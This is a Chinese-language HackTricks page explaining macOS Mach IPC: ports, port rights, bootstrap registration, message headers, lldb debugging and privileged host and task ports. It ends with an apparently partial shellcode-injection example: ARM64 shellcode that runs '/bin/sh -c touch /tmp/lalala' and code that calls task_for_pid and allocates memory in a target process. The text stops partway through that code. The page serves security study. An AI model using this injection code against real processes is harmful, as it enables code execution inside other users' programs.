# macOS IPC - 进程间通信

{{#include ../../../../banners/hacktricks-training.md}}

## Mach 通过端口进行消息传递

### 基本信息

Mach 使用 **任务** 作为共享资源的 **最小单位**，每个任务可以包含 **多个线程**。这些 **任务和线程与 POSIX 进程和线程 1:1 映射**。

任务之间的通信通过 Mach 进程间通信 (IPC) 进行，利用单向通信通道。**消息在端口之间传输**，这些端口充当由内核管理的 **消息队列**。

**端口** 是 Mach IPC 的 **基本** 元素。它可以用来 **发送和接收** 消息。

每个进程都有一个 **IPC 表**，在其中可以找到 **进程的 mach 端口**。mach 端口的名称实际上是一个数字（指向内核对象的指针）。

一个进程还可以将一个端口名称和一些权限 **发送到不同的任务**，内核会在 **另一个任务的 IPC 表** 中显示这个条目。

### 端口权限

定义任务可以执行哪些操作的端口权限是这种通信的关键。可能的 **端口权限** 是（[定义来自这里](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **接收权限**，允许接收发送到端口的消息。Mach 端口是 MPSC（多个生产者，单个消费者）队列，这意味着在整个系统中每个端口只能有 **一个接收权限**（与管道不同，多个进程可以持有一个管道的读端文件描述符）。
- 拥有 **接收权限** 的 **任务** 可以接收消息并 **创建发送权限**，允许其发送消息。最初只有 **自己的任务对其端口拥有接收权限**。
- 如果接收权限的拥有者 **死亡** 或被杀死，**发送权限变得无用（死名）**。
- **发送权限**，允许向端口发送消息。
- 发送权限可以被 **克隆**，因此拥有发送权限的任务可以克隆该权限并 **授予给第三个任务**。
- 请注意，**端口权限** 也可以通过 Mac 消息 **传递**。
- **一次性发送权限**，允许向端口发送一条消息，然后消失。
- 该权限 **不能** 被 **克隆**，但可以被 **移动**。
- **端口集权限**，表示一个 _端口集_ 而不是单个端口。从端口集中出队一条消息会从其包含的一个端口中出队一条消息。端口集可以用于同时监听多个端口，类似于 Unix 中的 `select`/`poll`/`epoll`/`kqueue`。
- **死名**，这不是一个实际的端口权限，而只是一个占位符。当一个端口被销毁时，所有现有的对该端口的端口权限都会变成死名。

**任务可以将发送权限转移给其他任务**，使其能够发送消息。**发送权限也可以被克隆，因此一个任务可以复制并将权限授予第三个任务**。这与一个称为 **引导服务器** 的中介进程结合，允许任务之间有效通信。

### 文件端口

文件端口允许在 Mac 端口中封装文件描述符（使用 Mach 端口权限）。可以使用 `fileport_makeport` 从给定的 FD 创建一个 `fileport`，并使用 `fileport_makefd` 从 fileport 创建一个 FD。

### 建立通信

如前所述，可以使用 Mach 消息发送权限，然而，您 **不能在没有发送 Mach 消息的权限的情况下发送权限**。那么，如何建立第一次通信呢？

为此，**引导服务器**（在 mac 中为 **launchd**）参与其中，因为 **任何人都可以获得引导服务器的发送权限**，可以请求它授予发送消息到另一个进程的权限：

1. 任务 **A** 创建一个 **新端口**，获得该端口的 **接收权限**。
2. 任务 **A**，作为接收权限的持有者，**为该端口生成一个发送权限**。
3. 任务 **A** 与 **引导服务器** 建立 **连接**，并 **将其为最初生成的端口发送的发送权限** 发送给它。
- 请记住，任何人都可以获得引导服务器的发送权限。
4. 任务 A 向引导服务器发送 `bootstrap_register` 消息，以 **将给定端口与名称** 关联，如 `com.apple.taska`。
5. 任务 **B** 与 **引导服务器** 交互以执行服务名称的引导 **查找**（`bootstrap_lookup`）。因此，引导服务器可以响应，任务 B 将在查找消息中发送 **先前创建的端口的发送权限**。如果查找成功，**服务器会复制从任务 A 接收到的发送权限** 并 **将其传输给任务 B**。
- 请记住，任何人都可以获得引导服务器的发送权限。
6. 通过这个发送权限，**任务 B** 能够 **发送** 一条 **消息** **给任务 A**。
7. 对于双向通信，通常任务 **B** 会生成一个带有 **接收** 权限和 **发送** 权限的新端口，并将 **发送权限授予任务 A**，以便它可以向任务 B 发送消息（双向通信）。

引导服务器 **无法验证** 任务声称的服务名称。这意味着一个 **任务** 可能会 **冒充任何系统任务**，例如虚假 **声称一个授权服务名称**，然后批准每个请求。

然后，Apple 将 **系统提供服务的名称** 存储在安全配置文件中，位于 **SIP 保护** 目录：`/System/Library/LaunchDaemons` 和 `/System/Library/LaunchAgents`。每个服务名称旁边，**相关的二进制文件也被存储**。引导服务器将为每个这些服务名称创建并持有一个 **接收权限**。

对于这些预定义服务，**查找过程略有不同**。当查找服务名称时，launchd 动态启动该服务。新的工作流程如下：

- 任务 **B** 启动对服务名称的引导 **查找**。
- **launchd** 检查任务是否正在运行，如果没有，则 **启动** 它。
- 任务 **A**（服务）执行 **引导签到**（`bootstrap_check_in()`）。在这里，**引导** 服务器创建一个发送权限，保留它，并 **将接收权限转移给任务 A**。
- launchd 复制 **发送权限并将其发送给任务 B**。
- 任务 **B** 生成一个带有 **接收** 权限和 **发送** 权限的新端口，并将 **发送权限授予任务 A**（svc），以便它可以向任务 B 发送消息（双向通信）。

然而，这个过程仅适用于预定义的系统任务。非系统任务仍然按照最初描述的方式操作，这可能会导致冒充。

> [!CAUTION]
> 因此，launchd 绝不能崩溃，否则整个系统将崩溃。

### 一个 Mach 消息

[在这里找到更多信息](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 函数，基本上是一个系统调用，用于发送和接收 Mach 消息。该函数要求将要发送的消息作为初始参数。此消息必须以 `mach_msg_header_t` 结构开头，后面跟着实际的消息内容。该结构定义如下：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
进程拥有 _**接收权**_ 可以在 Mach 端口上接收消息。相反，**发送者** 被授予 _**发送**_ 或 _**一次性发送权**_。一次性发送权仅用于发送单个消息，之后将失效。

初始字段 **`msgh_bits`** 是一个位图：

- 第一个位（最重要的位）用于指示消息是否复杂（下面会详细说明）
- 第3位和第4位由内核使用
- **第二个字节的5个最低有效位** 可用于 **凭证**：另一种发送键/值组合的端口类型。
- **第三个字节的5个最低有效位** 可用于 **本地端口**
- **第四个字节的5个最低有效位** 可用于 **远程端口**

可以在凭证、本地和远程端口中指定的类型是（来自 [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
例如，`MACH_MSG_TYPE_MAKE_SEND_ONCE` 可用于 **指示** 应该为此端口派生并转移一个 **一次性发送权**。也可以指定 `MACH_PORT_NULL` 以防止接收者能够回复。

为了实现简单的 **双向通信**，进程可以在 mach **消息头** 中指定一个 **mach 端口**，称为 _回复端口_ (**`msgh_local_port`**)，接收该消息的 **接收者** 可以 **发送回复**。

> [!TIP]
> 请注意，这种双向通信用于期望重放的 XPC 消息中（`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`）。但 **通常会创建不同的端口**，如前所述，以创建双向通信。

消息头的其他字段包括：

- `msgh_size`：整个数据包的大小。
- `msgh_remote_port`：发送此消息的端口。
- `msgh_voucher_port`：[mach 代金券](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`：此消息的 ID，由接收者解释。

> [!CAUTION]
> 请注意，**mach 消息是通过 `mach port` 发送的**，这是一个内置于 mach 内核的 **单接收者**、**多个发送者** 通信通道。**多个进程**可以 **向 mach 端口发送消息**，但在任何时候只有 **一个进程可以从中读取**。

消息由 **`mach_msg_header_t`** 头部、**主体**和 **尾部**（如果有的话）组成，并且可以授予回复的权限。在这些情况下，内核只需将消息从一个任务传递到另一个任务。

**尾部**是 **内核添加到消息的信息**（用户无法设置），可以在消息接收时通过标志 `MACH_RCV_TRAILER_<trailer_opt>` 请求（可以请求不同的信息）。

#### 复杂消息

然而，还有其他更 **复杂** 的消息，例如传递额外端口权或共享内存的消息，在这些情况下，内核还需要将这些对象发送给接收者。在这种情况下，头部的最显著位 `msgh_bits` 被设置。

可以传递的可能描述符在 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) 中定义：
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
在32位中，所有描述符都是12B，描述符类型在第11个。在64位中，大小各不相同。

> [!CAUTION]
> 内核会将描述符从一个任务复制到另一个任务，但首先**在内核内存中创建一个副本**。这种技术被称为“风水”，在多个漏洞中被滥用，使得**内核在其内存中复制数据**，使得一个进程将描述符发送给自己。然后该进程可以接收消息（内核会释放它们）。
>
> 也可以**将端口权限发送给一个易受攻击的进程**，端口权限将直接出现在该进程中（即使它没有处理这些权限）。

### Mac Ports APIs

请注意，端口与任务命名空间相关，因此要创建或搜索端口时，也会查询任务命名空间（更多内容见`mach/mach_port.h`）：

- **`mach_port_allocate` | `mach_port_construct`**: **创建**一个端口。
- `mach_port_allocate` 还可以创建一个**端口集**：对一组端口的接收权限。每当接收到消息时，会指明消息来自哪个端口。
- `mach_port_allocate_name`: 更改端口的名称（默认是32位整数）
- `mach_port_names`: 从目标获取端口名称
- `mach_port_type`: 获取任务对名称的权限
- `mach_port_rename`: 重命名端口（类似于FD的dup2）
- `mach_port_allocate`: 分配一个新的RECEIVE、PORT_SET或DEAD_NAME
- `mach_port_insert_right`: 在你拥有RECEIVE的端口中创建一个新的权限
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: 用于**发送和接收mach消息**的函数。覆盖版本允许为消息接收指定不同的缓冲区（另一个版本将仅重用它）。

### 调试 mach_msg

由于**`mach_msg`**和**`mach_msg_overwrite`**是用于发送和接收消息的函数，因此在它们上设置断点将允许检查发送和接收的消息。

例如，开始调试任何可以调试的应用程序，因为它将加载**`libSystem.B`，该库将使用此函数**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>断点 1: 位置 = libsystem_kernel.dylib`mach_msg, 地址 = 0x00000001803f6c20
<strong>(lldb) r
</strong>进程 71019 启动: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
进程 71019 停止
* 线程 #1, 队列 = 'com.apple.main-thread', 停止原因 = 断点 1.1
帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
目标 0: (SandboxedShellApp) 停止。
<strong>(lldb) bt
</strong>* 线程 #1, 队列 = 'com.apple.main-thread', 停止原因 = 断点 1.1
* 帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
帧 #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
帧 #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
帧 #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
帧 #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
帧 #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
帧 #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
帧 #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
帧 #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
帧 #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

要获取**`mach_msg`**的参数，请检查寄存器。这些是参数（来自[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
从注册表中获取值：
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
检查消息头，查看第一个参数：
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
该类型的 `mach_msg_bits_t` 非常常见，允许回复。

### 枚举端口
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**名称**是分配给端口的默认名称（检查它在前3个字节中的**增加**情况）。**`ipc-object`**是端口的**混淆**唯一**标识符**。\
还要注意，只有**`send`**权限的端口是**识别其所有者**的（端口名称 + pid）。\
还要注意使用**`+`**来表示**连接到同一端口的其他任务**。

还可以使用 [**procesxp**](https://www.newosxbook.com/tools/procexp.html) 来查看**注册的服务名称**（由于需要`com.apple.system-task-port`，因此禁用SIP）：
```
procesp 1 ports
```
您可以通过从 [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) 下载此工具来在 iOS 上安装它。

### 代码示例

注意 **发送者** 如何 **分配** 一个端口，为名称 `org.darlinghq.example` 创建一个 **发送权限** 并将其发送到 **引导服务器**，同时发送者请求该名称的 **发送权限** 并使用它来 **发送消息**。

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## 特权端口

有一些特殊端口允许**执行某些敏感操作或访问某些敏感数据**，前提是任务对它们具有**发送**权限。这使得这些端口从攻击者的角度来看非常有趣，不仅因为其能力，还因为可以**在任务之间共享发送权限**。

### 主机特殊端口

这些端口由一个数字表示。

**发送**权限可以通过调用**`host_get_special_port`**获得，而**接收**权限则通过调用**`host_set_special_port`**获得。然而，这两个调用都需要**`host_priv`**端口，只有root可以访问。此外，过去root能够调用**`host_set_special_port`**并劫持任意端口，例如通过劫持`HOST_KEXTD_PORT`来绕过代码签名（SIP现在防止了这种情况）。

这些端口分为两组：**前7个端口由内核拥有**，分别是1 `HOST_PORT`，2 `HOST_PRIV_PORT`，3 `HOST_IO_MASTER_PORT`，7是`HOST_MAX_SPECIAL_KERNEL_PORT`。\
从数字**8**开始的端口是**由系统守护进程拥有**，可以在[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html)中找到声明。

- **主机端口**：如果一个进程对这个端口具有**发送**权限，它可以通过调用其例程获取**系统**信息，例如：
  - `host_processor_info`：获取处理器信息
  - `host_info`：获取主机信息
  - `host_virtual_physical_table_info`：虚拟/物理页表（需要MACH_VMDEBUG）
  - `host_statistics`：获取主机统计信息
  - `mach_memory_info`：获取内核内存布局
- **主机特权端口**：对这个端口具有**发送**权限的进程可以执行**特权操作**，例如显示启动数据或尝试加载内核扩展。**进程需要是root**才能获得此权限。
- 此外，为了调用**`kext_request`** API，需要拥有其他权限**`com.apple.private.kext*`**，这些权限仅授予Apple二进制文件。
- 可以调用的其他例程包括：
  - `host_get_boot_info`：获取`machine_boot_info()`
  - `host_priv_statistics`：获取特权统计信息
  - `vm_allocate_cpm`：分配连续物理内存
  - `host_processors`：发送权限到主机处理器
  - `mach_vm_wire`：使内存常驻
- 由于**root**可以访问此权限，它可以调用`host_set_[special/exception]_port[s]`来**劫持主机特殊或异常端口**。

可以通过运行以下命令**查看所有主机特殊端口**：
```bash
procexp all ports | grep "HSP"
```
### 任务特殊端口

这些端口是为知名服务保留的。可以通过调用 `task_[get/set]_special_port` 来获取/设置它们。它们可以在 `task_special_ports.h` 中找到：
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
从 [这里](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: 用于控制此任务的端口。用于发送影响任务的消息。这是由 **mach_task_self (见下文的任务端口)** 返回的端口。
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: 任务的引导端口。用于发送请求返回其他系统服务端口的消息。
- **TASK_HOST_NAME_PORT**\[host-self send right]: 用于请求包含主机信息的端口。这是由 **mach_host_self** 返回的端口。
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: 命名此任务从中提取其有线内核内存的源的端口。
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: 命名此任务从中提取其默认内存管理内存的源的端口。

### 任务端口

最初，Mach没有“进程”，它有“任务”，这被认为更像是线程的容器。当Mach与BSD合并时，**每个任务与一个BSD进程相关联**。因此，每个BSD进程都有成为进程所需的详细信息，每个Mach任务也有其内部工作（除了不存在的pid 0，即`kernel_task`）。

有两个与此相关的非常有趣的函数：

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 获取与指定的`pid`相关的任务的任务端口的SEND权限，并将其授予指定的`target_task_port`（通常是使用`mach_task_self()`的调用任务，但也可以是不同任务上的SEND端口。）
- `pid_for_task(task, &pid)`: 给定一个任务的SEND权限，查找该任务相关的PID。

为了在任务内执行操作，任务需要对自己调用`mach_task_self()`的`SEND`权限（使用`task_self_trap` (28)）。有了这个权限，任务可以执行多个操作，例如：

- `task_threads`: 获取任务线程的所有任务端口的SEND权限
- `task_info`: 获取有关任务的信息
- `task_suspend/resume`: 暂停或恢复任务
- `task_[get/set]_special_port`
- `thread_create`: 创建线程
- `task_[get/set]_state`: 控制任务状态
- 更多内容可以在 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) 中找到

> [!CAUTION]
> 请注意，拥有对**不同任务**的任务端口的SEND权限，可以对不同任务执行此类操作。

此外，task_port也是**`vm_map`**端口，允许使用`vm_read()`和`vm_write()`等函数**读取和操作**任务内的内存。这基本上意味着，拥有对不同任务的task_port的SEND权限的任务将能够**注入代码到该任务中**。

请记住，因为**内核也是一个任务**，如果有人设法获得对**`kernel_task`**的**SEND权限**，它将能够使内核执行任何操作（越狱）。

- 调用`mach_task_self()`以**获取此端口的名称**，用于调用任务。此端口仅在**`exec()`**中**继承**；使用`fork()`创建的新任务会获得一个新的任务端口（作为特例，任务在suid二进制文件中的`exec()`后也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行`fork()`时进行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)。
- 访问端口的限制（来自二进制文件`AppleMobileFileIntegrity`的`macos_task_policy`）：
- 如果应用具有**`com.apple.security.get-task-allow` 权限**，则来自**同一用户的进程可以访问任务端口**（通常由Xcode为调试添加）。**公证**过程不允许其用于生产版本。
- 具有**`com.apple.system-task-ports`**权限的应用可以获取**任何**进程的任务端口，除了内核。在旧版本中称为**`task_for_pid-allow`**。这仅授予Apple应用。
- **Root可以访问未**使用**强化**运行时编译的应用程序的任务端口（并且不是来自Apple的）。

**任务名称端口：** 一个未特权版本的_task port_。它引用任务，但不允许控制它。通过它似乎唯一可用的功能是`task_info()`。

### 线程端口

线程也有相关的端口，可以从调用**`task_threads`**的任务和使用`processor_set_threads`的处理器中看到。对线程端口的SEND权限允许使用`thread_act`子系统中的函数，例如：

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

任何线程都可以通过调用**`mach_thread_sef`**来获取此端口。

### 通过任务端口在线程中注入Shellcode

您可以从以下位置获取Shellcode：

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**编译**之前的程序并添加**权限**以便能够以相同用户注入代码（如果没有，您将需要使用**sudo**）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
